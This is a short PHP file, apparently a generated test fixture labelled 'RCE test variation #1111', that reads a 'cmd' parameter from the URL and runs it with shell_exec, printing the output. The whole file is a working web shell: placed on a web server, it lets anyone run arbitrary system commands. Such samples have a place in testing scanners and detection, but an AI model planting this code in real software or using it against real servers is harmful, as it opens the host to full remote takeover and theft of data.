<?php
// RCE test variation #1111
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>